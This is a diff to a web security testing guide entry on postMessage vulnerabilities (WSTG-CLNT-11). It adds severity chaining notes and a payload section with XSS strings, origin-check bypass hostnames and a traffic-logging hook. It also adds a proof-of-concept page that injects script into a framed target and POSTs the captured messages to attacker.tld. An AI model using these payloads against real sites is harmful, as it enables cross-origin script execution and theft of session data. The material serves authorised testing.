@@ -8,9 +8,11 @@ author: cyberstrike-official
 tags: [client-side, javascript, dom, cors, wstg, clnt]
 tech_stack: []
 cwe_ids: [CWE-79]
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-clnt-01, wstg-clnt-02]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-clnt-01: "A postMessage handler without origin validation feeding an innerHTML/document.write sink = fully cross-origin DOM XSS triggerable by any site that embeds the target in an iframe, with no need to control the vulnerable page's own URL — Critical"
+  wstg-clnt-02: "A postMessage handler without origin validation feeding eval()/Function() = arbitrary cross-origin code execution in the victim's authenticated session, triggered by simply visiting an attacker page — Critical"
 ---
 
 # wstg-clnt-11
@@ -328,6 +330,61 @@ targetWindow.postMessage(sensitiveData, "*")
 | Burp Suite       | Intercept and analyze messages               |
 | PMHook           | Browser extension for postMessage monitoring |
 | Custom PoC       | Test specific vulnerabilities                |
+
+---
+
+## Example Commands/Payloads
+
+### postMessage origin-bypass / XSS payloads
+
+```javascript
+// Wildcard targetOrigin abuse - send from attacker.tld
+iframe.contentWindow.postMessage("<img src=x onerror=alert(document.domain)>", "*")
+
+// Weak substring origin check bypass (event.origin.indexOf('trusted.com') !== -1)
+// Host the attacker page at either of these:
+//   https://attacker-trusted.com
+//   https://trusted.com.attacker.tld
+
+// JSON payload targeting a message handler that trusts "action"
+iframe.contentWindow.postMessage(
+  JSON.stringify({ action: "admin", id: "../../admin" }),
+  "*"
+)
+```
+
+### Monitor postMessage traffic (browser console)
+
+```javascript
+const originalPostMessage = window.postMessage
+window.postMessage = function (message, targetOrigin, transfer) {
+  console.log("postMessage:", message, targetOrigin)
+  return originalPostMessage.apply(this, arguments)
+}
+window.addEventListener("message", (e) => console.log("recv:", e.origin, e.data), true)
+```
+
+### Full exploitation PoC (host on attacker.tld)
+
+```html
+<!DOCTYPE html>
+<html>
+<body>
+  <iframe id="target" src="https://{target}/page-with-postmessage"></iframe>
+  <script>
+    document.getElementById("target").onload = function () {
+      this.contentWindow.postMessage("<img src=x onerror=alert(document.domain)>", "*")
+    }
+    window.addEventListener("message", (event) => {
+      fetch("https://attacker.tld/log", {
+        method: "POST",
+        body: JSON.stringify({ origin: event.origin, data: event.data }),
+      })
+    })
+  </script>
+</body>
+</html>
+```
 
 ---
 
